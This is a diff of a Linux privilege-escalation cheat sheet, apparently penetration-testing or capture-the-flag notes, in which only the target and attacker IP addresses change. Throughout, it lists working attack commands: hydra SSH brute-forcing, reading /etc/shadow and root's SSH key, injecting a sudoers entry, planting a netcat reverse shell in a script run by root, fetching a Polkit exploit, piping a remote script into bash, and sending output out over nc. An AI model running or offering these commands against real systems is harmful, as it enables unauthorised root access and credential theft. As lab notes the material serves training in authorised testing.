@@ -21,8 +21,8 @@ USERS
 cat /etc/passwd
 grep -vE 'nologin|false' /etc/passwd  
 su founduser (pw: founduser)
-ssh founduser@10.129.97.56
-hydra -f -V -I -t 50 -l founduser -P $commontenk 10.129.97.56 ssh
+ssh founduser@192.168.200.5
+hydra -f -V -I -t 50 -l founduser -P $commontenk 192.168.200.5 ssh
 ll /etc/passwd /etc/shadow
 
 =================================== 
@@ -67,7 +67,7 @@ php7.2 -r "pcntl exec('/bin/sh', ['-p']);"
 
 /usr/bin/base32 /etc/shadow | /usr/bin/base32 --decode
 /usr/bin/base32 /root/.ssh/id_rsa | /usr/bin/base32 --decode 
-vim id_rsa; chmod 600 id_rsa; ssh root@10.129.97.56 -i id_rsa 
+vim id_rsa; chmod 600 id_rsa; ssh root@192.168.200.5 -i id_rsa 
 
 LFILE='/etc/sudoers'
 /usr/bin/dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >>c:$LFILE" -c exit
@@ -266,8 +266,8 @@ DIR INJECTION
 
 Found SMB Share with "ITSHOP" 
 Matches a log showing root executes "/home/bob/ITSHOP/script" 
-echo "nc -nv 10.10.16.135 443 -e /bin/bash &" > script 
-smbclient //10.129.97.56/ITDEPT 
+echo "nc -nv 192.168.162.46 443 -e /bin/bash &" > script 
+smbclient //192.168.200.5/ITDEPT 
 put script 
 
 ===================================
@@ -284,7 +284,7 @@ sudoedit -s /.     ...Not vuln: sudoedit usage results
 
 Polkit (CVE-2021-3650)
 https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
-wget http://10.10.16.135/cve-2021-3650.sh
+wget http://192.168.162.46/cve-2021-3650.sh
 bash polkit.sh   ...try more than once
 su - secnigma
 pass: secnigmaftw 
@@ -299,16 +299,16 @@ cd /opt/linux_privesc
 sudo python3 -m http.server 80
 
 cd /var/tmp 
-wget http://10.10.16.135:80/linpeas.sh                  ..best
-wget http://10.10.16.135:80/lse.sh                      ..compliment to linpeas
-wget http://10.10.16.135:80/pspy32                      ..crons
-wget http://10.10.16.135:80/suid3num.py                 ..suid check
-wget http://10.10.16.135:80/Linuxprivchecker.py         ..prefer 
-wget http://10.10.16.135:80/LinEnum.sh                  ..second best 
-wget http://10.10.16.135:80/unixprivesc.sh              ..maybe
-wget http://10.10.16.135:80/linux-exploit-suggester.sh  ..kernel exploits (dirtycow, rds, etc)
-wget -r http://10.10.16.135:80/ -P /var/tmp/            ..ALL
-curl 10.10.16.135:80/linux-exploit-suggester.sh | bash  ..autorun
+wget http://192.168.162.46:80/linpeas.sh                  ..best
+wget http://192.168.162.46:80/lse.sh                      ..compliment to linpeas
+wget http://192.168.162.46:80/pspy32                      ..crons
+wget http://192.168.162.46:80/suid3num.py                 ..suid check
+wget http://192.168.162.46:80/Linuxprivchecker.py         ..prefer 
+wget http://192.168.162.46:80/LinEnum.sh                  ..second best 
+wget http://192.168.162.46:80/unixprivesc.sh              ..maybe
+wget http://192.168.162.46:80/linux-exploit-suggester.sh  ..kernel exploits (dirtycow, rds, etc)
+wget -r http://192.168.162.46:80/ -P /var/tmp/            ..ALL
+curl 192.168.162.46:80/linux-exploit-suggester.sh | bash  ..autorun
 
 
 ===================================
@@ -335,10 +335,10 @@ less -r /var/tmp/linpeas.txt
 
 Results to Kali
 kali> nc -lvnp 9090 > linpeas.txt 
-linx> nc 10.10.16.135 9090 < linpeas.txt 
+linx> nc 192.168.162.46 9090 < linpeas.txt 
 
 Send to Target
-scp pspy bob@10.129.97.56
+scp pspy bob@192.168.200.5
 
 
 ===================================
